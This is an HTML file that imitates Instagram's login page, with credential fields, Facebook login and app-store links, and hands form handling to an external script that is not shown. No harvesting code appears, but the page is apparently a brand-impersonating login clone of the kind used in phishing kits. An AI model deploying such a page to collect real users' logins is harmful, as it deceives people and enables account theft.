<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Instagram Login">
  <title>Instagram</title>
  <link rel="icon" href="https://1000logos.net/wp-content/uploads/2017/02/Instagram-Logo.png">
  <link rel="stylesheet" href="css/login.css">
</head>

<body>
  <div class="main-container">
    <!-- Login Box -->
    <div class="login-box">
      <!-- Instagram Logo -->
      <div class="logo-container">
        <h1 class="instagram-logo" aria-label="Instagram">
          <img src="https://1000logos.net/wp-content/uploads/2017/02/Instagram-Logo.png" alt="Instagram"
            class="logo-img">
        </h1>
      </div>

      <!-- Login Form -->
      <form id="loginForm" autocomplete="off">
        <div class="input-group">
          <input type="text" id="username" name="username" required autocomplete="off">
          <label for="username">Phone number, username, or email</label>
        </div>

        <div class="input-group">
          <input type="password" id="password" name="password" required autocomplete="off">
          <label for="password">Password</label>
          <button type="button" class="show-password" id="togglePassword">Show</button>
        </div>

        <button type="submit" class="login-btn" id="loginBtn">
          <span class="btn-text">Log in</span>
          <span class="btn-loader" style="display:none;"></span>
        </button>
      </form>

      <!-- Divider -->
      <div class="divider">
        <div class="line"></div>
        <span>OR</span>
        <div class="line"></div>
      </div>

      <!-- Facebook Login -->
      <a href="#" class="fb-login">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20" fill="#385185">
          <path
            d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z" />
        </svg>
        Log in with Facebook
      </a>

      <!-- Forgot Password -->
      <a href="#" class="forgot-password">Forgot password?</a>
    </div>

    <!-- Sign Up Box -->
    <div class="signup-box">
      <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>

    <!-- Get the App -->
    <div class="get-app">
      <p>Get the app.</p>
      <div class="app-stores">
        <a href="#">
          <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play"
            height="40">
        </a>
        <a href="#">
          <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it from Microsoft"
            height="40">
        </a>
      </div>
    </div>
  </div>

  <!-- Footer -->
  <footer class="footer">
    <div class="footer-links">
      <a href="#">Meta</a>
      <a href="#">About</a>
      <a href="#">Blog</a>
      <a href="#">Jobs</a>
      <a href="#">Help</a>
      <a href="#">API</a>
      <a href="#">Privacy</a>
      <a href="#">Terms</a>
      <a href="#">Locations</a>
      <a href="#">Instagram Lite</a>
      <a href="#">Threads</a>
      <a href="#">Contact Uploading & Non-Users</a>
      <a href="#">Meta Verified</a>
    </div>
    <div class="footer-bottom">
      <select>
        <option>English</option>
        <option>Hindi</option>
        <option>Español</option>
      </select>
      <span>© 2026 Instagram from Meta</span>
    </div>
  </footer>

  <script src="js/login.js"></script>
</body>

</html>
